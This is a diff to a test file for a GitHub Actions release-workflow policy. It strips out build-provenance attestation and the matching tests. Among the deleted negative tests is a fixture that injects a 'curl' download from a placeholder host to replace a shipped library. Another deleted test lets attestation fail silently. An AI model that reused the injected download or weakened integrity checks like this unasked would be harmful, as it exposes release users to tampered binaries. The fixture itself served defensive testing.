@@ -1,6 +1,5 @@
 """Static contracts for the protected GBA Wi-Fi Link validation workflow."""
 
-import hashlib
 import json
 from pathlib import Path
 import shutil
@@ -47,15 +46,6 @@ class WorkflowPolicyTest(unittest.TestCase):
             shutil.copy2(contract_source, contract)
             workflow = repo / ".github/workflows/gba-wifi-link-release.yml"
             workflow.write_text(mutate(workflow.read_text(encoding="utf-8")), encoding="utf-8")
-            value = json.loads(contract.read_text(encoding="utf-8"))
-            source = workflow.read_text(encoding="utf-8")
-            value["release_workflow"]["yaml_source_sha256"] = hashlib.sha256(
-                source.encode("utf-8")
-            ).hexdigest()
-            value["release_workflow"]["yaml_lexical_sha256"] = hashlib.sha256(
-                ("\n".join(lex_workflow_yaml(source)) + "\n").encode("utf-8")
-            ).hexdigest()
-            contract.write_text(json.dumps(value), encoding="utf-8")
             with self.assertRaises(WorkflowPolicyError):
                 validate_release_workflow_policy(repo)
 
@@ -115,9 +105,6 @@ jobs:
         self.assertEqual(
             history["action_pins"],
             {
-                "actions/attest-build-provenance": {
-                    "sha": "977bb373ede98d70efdf65b84cb5f73e068dcc2a", "version": "v3",
-                },
                 "actions/checkout": {
                     "sha": "d23441a48e516b6c34aea4fa41551a30e30af803", "version": "v6",
                 },
@@ -253,6 +240,24 @@ jobs:
     def test_release_workflow_satisfies_the_automatic_tag_contract(self):
         validate_release_workflow_policy(ROOT)
 
+    def test_canonical_publisher_handoff_contains_every_imported_module(self):
+        source = (ROOT / ".github/workflows/gba-wifi-link-release.yml").read_text(
+            encoding="utf-8"
+        )
+        self.assertIn(" publisher render resource_limits text_policy verifier; do", source)
+
+    def test_release_workflow_uses_only_trusted_tag_publication_permissions(self):
+        source = (ROOT / ".github/workflows/gba-wifi-link-release.yml").read_text(
+            encoding="utf-8"
+        )
+        self.assertIn("  push:\n    tags:\n      - v*", source)
+        self.assertNotIn("workflow_dispatch", source)
+        self.assertIn("  publish:\n    name: Automatically publish", source)
+        self.assertIn("    permissions:\n      contents: write\n", source)
+        self.assertNotIn("attestations:", source)
+        self.assertNotIn("id-token:", source)
+        self.assertNotIn("actions/attest-build-provenance", source)
+
     def test_release_admission_has_no_ruleset_audit_credential(self):
         source = (ROOT / ".github/workflows/gba-wifi-link-release.yml").read_text(encoding="utf-8")
         self.assertNotIn("GBA_WIFI_LINK_RULESET_AUDIT_TOKEN", source)
@@ -317,10 +322,8 @@ jobs:
     def test_release_workflow_exact_rerun_is_read_only_through_publisher(self):
         source = (ROOT / ".github/workflows/gba-wifi-link-release.yml").read_text(encoding="utf-8")
         self.assertIn("--allow-existing-release", source)
-        self.assertIn("release_exists: ${{ steps.evidence.outputs.release_exists }}", source)
-        condition = "if: ${{ needs.admit.outputs.release_exists != 'true' }}"
-        self.assertIn(condition, source)
-        self.assertEqual(source.count(condition), 2)
+        self.assertIn("tools/gba-wifi-link-release.py publish", source)
+        self.assertNotIn("release_exists: ${{ steps.evidence.outputs.release_exists }}", source)
 
     def test_release_workflow_rejects_trigger_concurrency_or_human_gate_mutations(self):
         mutations = (
@@ -329,8 +332,8 @@ jobs:
             lambda source: source.replace("github.ref }}", "github.sha }}", 1),
             lambda source: source.replace("cancel-in-progress: false", "cancel-in-progress: true", 1),
             lambda source: source.replace(
-                "  publish:\n    name: Attest and automatically publish",
-                "  publish:\n    environment: production\n    name: Attest and automatically publish",
+                "  publish:\n    name: Automatically publish",
+                "  publish:\n    environment: production\n    name: Automatically publish",
                 1,
             ),
         )
@@ -345,8 +348,7 @@ jobs:
                 "permissions:\n  actions: read\n  contents: write",
                 1,
             ),
-            lambda source: source.replace("      attestations: write", "      attestations: read", 1),
-            lambda source: source.replace("      id-token: write", "      id-token: read", 1),
+            lambda source: source.replace("      contents: write", "      contents: read", 1),
             lambda source: source.replace(
                 "  compare-builds:\n    name:",
                 "  compare-builds:\n    permissions:\n      contents: write\n    name:",
@@ -398,7 +400,6 @@ jobs:
             lambda source: source.replace("actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803", "actions/checkout@v6", 1),
             lambda source: source.replace("actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0", "actions/download-artifact@v5", 1),
             lambda source: source.replace("actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02", "actions/upload-artifact@v4", 1),
-            lambda source: source.replace("actions/attest-build-provenance@977bb373ede98d70efdf65b84cb5f73e068dcc2a", "actions/attest-build-provenance@v3", 1),
             lambda source: source.replace("name: gba-wifi-link-release-canonical", "name: arbitrary-publisher-input", 1),
             lambda source: source.replace("if-no-files-found: error", "if-no-files-found: warn", 1),
         )
@@ -438,16 +439,6 @@ jobs:
                 1,
             ),
             lambda source: source.replace(" verify-tag ", " render-body ", 1),
-            lambda source: source.replace(
-                "      - name: Attest admitted core",
-                "      - name: Download replacement\n        run: curl https://example.invalid/core -o publisher-input/release/mgba_libretro_android.so\n\n      - name: Attest admitted core",
-                1,
-            ),
-            lambda source: source.replace(
-                "      - name: Attest admitted core",
-                "      - name: Attest admitted core\n        continue-on-error: true",
-                1,
-            ),
             lambda source: source.replace(
                 "      - name: Publish transaction and final public verification",
                 "      - name: Publish transaction and final public verification\n        if: always()",
